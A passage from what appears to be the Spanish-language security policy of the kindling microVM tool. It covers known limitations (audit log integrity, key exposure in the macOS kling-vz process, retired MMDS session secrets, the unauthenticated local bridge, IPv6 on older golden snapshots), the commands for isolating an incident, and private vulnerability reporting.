  repetirlos. En Linux y en macOS; en macOS el `kling-vz` del agente pide cada conexión
  al broker de enlaces del daemon (ver 7).
- **El registro de auditoría es observabilidad, no prueba.** En Linux vive en
  `<root>/audit`, fuera del alcance del VMM (ver 7), pero lo migrado desde versiones
  anteriores estuvo en un directorio que el VMM podía tocar. En macOS lo escribe
  `kling-vz`, el proceso que termina el tráfico del invitado, en el directorio de la
  máquina: un `kling-vz` comprometido puede borrarlo o reescribirlo. No hay fsync: lo que estaba en el búfer al caer el host se
  pierde (lo escrito sobrevive a que maten el proceso, que es como el daemon para a
  `kling-vz`). Si se necesita un registro a prueba de manipulación, hay que sacarlo del
  host (`kling machine audit -f -json` a un colector).
- **En macOS la clave vive en un proceso que el invitado alcanza por la red.** Es el
  `kling-vz` de su máquina, que corre como el usuario y procesa su tráfico (ver 7). Un
  fallo explotable en su pila de red, DNS o MMDS que antes daba un proceso sin claves
  daría ahora la de esa máquina (solo la de esa: cada máquina tiene su `kling-vz`). En
  Linux la clave nunca sale del daemon. **Plan** (#80, diseñado, sin implementar):
  sacar el proxy a un proceso propio por máquina (`kling-credproxy`), confinado en un
  perfil sin Virtualization.framework, sin disco salvo su registro y con la red justa;
  el daemon le entrega las claves a él y `kling-vz` solo recibe dominios y marcadores,
  y le pasa cada conexión de la pasarela por un socket Unix. Un fallo en la pila de red
  de `kling-vz` dejaría de dar la clave; uno en el propio proxy, no. Proceso, perfil,
  IPC, coste y qué falta para hacerlo en
  [`docs/proxy-macos-separado.md`](docs/proxy-macos-separado.md).
- **Los secretos por sesión de MMDS (`sessions[<id>]`) están retirados.** El id de
  sesión lo genera el puente DENTRO del invitado (PID 1, root) justo al lanzar el
  hijo para `initialize`. Como el bridge y el servidor MCP corre como root y lee el
  almacén MMDS completo, una sesión comprometerida vería los secretos de todas las
  otras. El almacén sigue aceptando el campo para atrás-compatibilidad, pero se ignora
  y se avisa si está presente. Alternativas seguras: (1) credencial de plantilla (una
  por servicio, entregada a cada réplica al nacer); (2) proxy de credenciales para
  aislar claves por dominio; (3) VM efímera por sesión si necesitas secretos por
  sesión reales.
- **El puente local (`kling-bridge-local`) no autentica.** Por eso escucha en
  `127.0.0.1:8080` por defecto (`kling mcp memory enable`/`install-service` le pasan
  `127.0.0.1:9100`); exponerlo a la red es una decisión explícita
  (`-listen 0.0.0.0:9100`) y avisa: `install-service` por la terminal y el propio puente
  en su log. Dentro de la microVM el `/entrypoint` generado pide `-listen :8080`, donde
  lo busca el gateway; ahí, como PID 1, no avisa.
- **`ipv6.disable=1` no llega a un snapshot dorado ya congelado, pero ya no es un límite
  silencioso.** Solo se lee en un arranque en frío; restaurar un dorado hecho antes de
  este cambio sigue con el módulo IPv6 del kernel del invitado cargado. La barrera del
  namespace (`applyIPv6Barrier`) no tiene ese límite y cierra el paso igual a esos
  dorados —esto no reabre una fuga, es defensa en profundidad que falta en una capa—,
  pero el invitado, si conserva IPv6 vivo, aún podría auto-asignarse una link-local
  dentro de su propia pila. Cada dorado guarda ahora si se congeló con la barrera activa
  (`guest_ipv6_off` en su meta; ausente en los anteriores a este cambio, que se leen como
  "no consta", nunca como "confirmado sin ella"). La primera vez que se instancia un
  dorado sin esa marca, el daemon avisa una vez (log y evento `snapshot.guest_ipv6`) con
  cómo rehacerlo, y `kling snapshots` / `kling template inspect <nombre>` lo señalan. Un
  dorado nuevo, o uno recongelado tras este cambio (`kling commit -replace <máquina>
  <nombre>`), ya arranca con el módulo descargado y no vuelve a avisar.

## Ante un incidente

Aislar sin destruir pruebas:

```sh
kling stop <ref>     # mata el VMM, conserva overlay y snapshot
kling ps -a          # qué había, con su IP y su política de salida
kling topo           # de qué snapshot salió cada instancia
```

Si se sospecha del snapshot dorado, revisar las instancias antes de borrarlo: `kling rmi` se
niega si quedan vivas.

## Reportar una vulnerabilidad

Si encuentras un problema de seguridad en kindling, repórtalo en privado desde la pestaña
**Security** del repositorio (`juan52878911/kindling`) → **Report a vulnerability**
(GitHub Private Vulnerability Reporting). No abras un issue público: eso expone el
problema antes de que haya un arreglo.
